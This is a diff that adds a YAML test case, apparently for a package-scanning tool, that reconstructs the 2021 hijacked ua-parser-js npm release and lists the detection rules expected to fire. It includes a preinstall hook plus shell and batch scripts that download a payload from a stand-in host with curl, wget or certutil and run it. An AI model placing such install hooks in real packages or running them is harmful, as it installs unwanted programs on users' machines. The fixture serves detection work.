@@ -1,0 +1,44 @@
+id: ua-parser-js
+title: ua-parser-js hijacked releases
+kind: incident
+year: 2021
+technique: >
+  After a maintainer's npm account was taken over, three versions of ua-parser-js were
+  published with an install script that downloaded and started programs (a crypto
+  miner and a password stealer); on Windows certutil fetched an executable.
+sources:
+  - https://github.com/advisories/GHSA-pjwm-rvh2-c87w
+  - https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js
+  - https://github.com/faisalman/ua-parser-js/issues/536
+reconstruction: >
+  A preinstall script that starts a local JavaScript file, which picks a shell script
+  (Linux: download into /tmp, make executable, start) or a batch file (Windows:
+  certutil -urlcache download, start). All downloads point to example.invalid.
+files:
+  package.json: |
+    {
+      "name": "ua-parser-js",
+      "version": "0.7.29",
+      "scripts": {
+        "preinstall": "start /B node preinstall.js & node preinstall.js"
+      }
+    }
+  preinstall.js: |
+    const { exec } = require("child_process");
+    const os = require("os");
+    if (os.type() === "Linux") exec("sh preinstall.sh");
+    else if (os.type() === "Windows_NT") exec("preinstall.bat");
+  preinstall.sh: |
+    #!/bin/sh
+    curl -s https://example.invalid/payload -o /tmp/payload || wget -q https://example.invalid/payload -O /tmp/payload
+    chmod +x /tmp/payload
+    /tmp/payload
+  preinstall.bat: |
+    @echo off
+    certutil.exe -urlcache -f https://example.invalid/payload.exe payload.exe
+    payload.exe
+must_fire:
+  - {rule: RC-AUTO-001, path: package.json}
+  - {rule: RC-DLX-002, path: preinstall.bat}
+  - {rule: RC-DLX-004, path: preinstall.sh}
+must_not_fire: [RC-BIN-001, RC-DEP-001]
